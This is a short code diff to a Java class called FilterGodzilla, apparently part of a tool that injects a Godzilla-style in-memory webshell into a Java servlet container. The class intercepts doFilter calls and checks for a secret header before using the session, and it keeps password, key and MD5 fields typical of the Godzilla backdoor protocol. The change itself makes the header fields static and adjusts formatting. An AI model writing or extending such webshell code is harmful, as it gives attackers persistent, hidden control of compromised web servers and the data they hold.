@@ -20,8 +20,8 @@ public class FilterGodzilla implements InvocationHandler {
     public static String key; // key
     public static String pass;
     public static String md5 = md5(pass + key);
-    private String lockHeaderKey;
-    private String lockHeaderValue;
+    private static String lockHeaderKey;
+    private static String lockHeaderValue;
 
     public Object invoke(Object proxy, Method method, Object[] args) {
         if (method.getName().equals("doFilter")) {
@@ -33,7 +33,7 @@ public class FilterGodzilla implements InvocationHandler {
     private void run(Object servletRequest, Object servletResponse, Object filterChain) {
         try {
             String lv = (String) invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
-            if(lv == null || !lv.contains(lockHeaderValue)) {
+            if (lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
             Object session = invokeMethod(servletRequest, "getSession", new Class[]{}, new Object[]{});
